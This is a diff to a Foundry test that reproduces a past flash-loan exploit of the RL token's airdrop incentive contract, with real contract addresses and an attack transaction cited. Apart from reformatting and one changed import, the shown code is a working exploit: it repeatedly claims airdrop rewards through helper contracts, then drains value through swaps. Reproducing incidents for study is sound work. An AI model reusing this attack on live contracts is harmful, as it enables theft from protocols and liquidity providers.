@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // Report https://twitter.com/CertiKAlert/status/1576195971003858944
@@ -13,23 +13,24 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // Attack Tx  0xe15d261403612571edf8ea8be78458b88989cf1877f0b51af9159a76b74cb466
 
 interface IDODO {
-
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+    function flashLoan(
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        address assetTo,
+        bytes calldata data
+    ) external;
 
     function _BASE_TOKEN_() external view returns (address);
-
 }
 
 interface RLLpIncentive {
-
     function distributeAirdrop(address user) external;
-
 }
 
 contract AirDropRewardContract {
-
     IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);
-    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
+    RLLpIncentive RLL =
+        RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
     IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);
 
     constructor() {
@@ -41,17 +42,17 @@ contract AirDropRewardContract {
         RL.transfer(receiver, RL.balanceOf(address(this)));
         Pair.transfer(receiver, Pair.balanceOf(address(this)));
     }
-
 }
 
 contract ContractTest is Test {
-
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);
-    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
+    RLLpIncentive RLL =
+        RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
     IDODO dodo = IDODO(0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE);
     IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);
-    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV2Router Router =
+        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address[] public contractAddress;
 
     function setUp() public {
@@ -59,7 +60,11 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "[Start] Attacker USDT balance before exploit",
+            USDT.balanceOf(address(this)),
+            18
+        );
 
         USDT.approve(address(Router), ~uint256(0));
         RL.approve(address(Router), ~uint256(0));
@@ -69,15 +74,26 @@ contract ContractTest is Test {
         vm.warp(block.timestamp + 24 * 60 * 60);
         dodo.flashLoan(0, 450_000 * 1e18, address(this), new bytes(1));
 
-        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "[End] Attacker USDT balance after exploit",
+            USDT.balanceOf(address(this)),
+            18
+        );
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+    function DPPFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) external {
         buyRLAndAddLiquidity();
         //claimAirDrop
         for (uint256 i = 0; i < contractAddress.length; i++) {
             Pair.transfer(contractAddress[i], Pair.balanceOf(address(this)));
-            (bool success,) = contractAddress[i].call(abi.encodeWithSignature("airDropReward(address)", address(this)));
+            (bool success, ) = contractAddress[i].call(
+                abi.encodeWithSignature("airDropReward(address)", address(this))
+            );
             require(success);
         }
 
@@ -90,7 +106,11 @@ contract ContractTest is Test {
         path[0] = address(USDT);
         path[1] = address(RL);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            150_000 * 1e18, 0, path, address(this), block.timestamp
+            150_000 * 1e18,
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
 
         Router.addLiquidity(
@@ -107,14 +127,24 @@ contract ContractTest is Test {
 
     function removeLiquidityAndSellRL() public {
         Router.removeLiquidity(
-            address(USDT), address(RL), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
+            address(USDT),
+            address(RL),
+            Pair.balanceOf(address(this)),
+            0,
+            0,
+            address(this),
+            block.timestamp
         );
 
         address[] memory path = new address[](2);
         path[0] = address(RL);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            RL.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            RL.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
 
@@ -128,5 +158,4 @@ contract ContractTest is Test {
             contractAddress.push(_add);
         }
     }
-
 }
